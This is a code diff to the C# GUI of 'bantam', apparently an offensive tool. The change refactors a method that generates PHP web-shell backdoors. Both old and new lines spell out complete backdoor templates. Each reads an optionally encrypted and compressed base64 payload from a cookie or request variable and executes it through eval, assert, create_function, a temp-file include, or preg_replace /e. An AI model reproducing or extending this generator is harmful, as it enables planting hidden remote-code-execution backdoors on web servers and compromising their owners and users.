@@ -150,11 +150,11 @@ namespace bantam.Forms
         /// 
         /// </summary>
         /// <param name="varName"></param>
-        /// <param name="varType"></param>
+        /// <param name="method"></param>
         /// <param name="gzInflateRequest"></param>
         /// <param name="backdoorType"></param>
         /// <returns></returns>
-        public string generateBackdoor(string varName = "command", string varType = "COOKIE", bool gzInflateRequest = false, BackdoorTypes backdoorType = BackdoorTypes.EVAL)
+        public string generateBackdoor(string varName = "command", string method = "COOKIE", bool gzInflateRequest = false, BackdoorTypes backdoorType = BackdoorTypes.EVAL)
         {
             string backdoorResult = string.Empty;
             string gzInflateStart = string.Empty;
@@ -162,7 +162,7 @@ namespace bantam.Forms
             string requestEncryptionStart = string.Empty;
             string requestEncryptionEnd = string.Empty;
 
-            varType = varType.ToUpper(CultureInfo.InvariantCulture);
+            string requestMethod = method.ToUpper(CultureInfo.InvariantCulture);
 
             if (checkBoxEncryptRequest.Checked) {
                 string encryptionKey = textBoxEncrpytionKey.Text;
@@ -178,10 +178,10 @@ namespace bantam.Forms
 
                             if (comboBoxRequestEncryptionType.Text == "openssl") {
                                 requestEncryptionStart = "@openssl_decrypt(";
-                                requestEncryptionEnd = ", 'AES-256-CBC', '" + encryptionKey + "', OPENSSL_RAW_DATA, $_" + varType + "['" + encryptionIVVarName + "'])";
+                                requestEncryptionEnd = ", 'AES-256-CBC', '" + encryptionKey + "', OPENSSL_RAW_DATA, $_" + requestMethod + "['" + encryptionIVVarName + "'])";
                             } else if (comboBoxRequestEncryptionType.Text == "mcrypt") {
                                 requestEncryptionStart = "rtrim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', ";
-                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, $_" + varType + "['" + encryptionIVVarName + "']), \"\0\")";
+                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, $_" + requestMethod + "['" + encryptionIVVarName + "']), \"\0\")";
                             } else {
                                 //todo fail
                             }
@@ -214,30 +214,33 @@ namespace bantam.Forms
 
             switch (backdoorType) {
                 case BackdoorTypes.EVAL: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.ASSERT: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.CREATE_FUNCTION: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t$a();\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t$a();\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.TMP_INCLUDE: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '." + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '." + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.PREG_REPLACE: {
                         //todo this looks wrong af and doesnt support gzip
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "']" + requestEncryptionEnd + gzInflateEnd + "),'.');\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "']" + requestEncryptionEnd + gzInflateEnd + "),'.');\r\n}";
                         break;
                     }
+                default:
+                    MessageBox.Show("Unknon backdoor type selection.", "GUI Error");
+                break;
             }
 
             if (chkbxMinifyCode.Checked) {
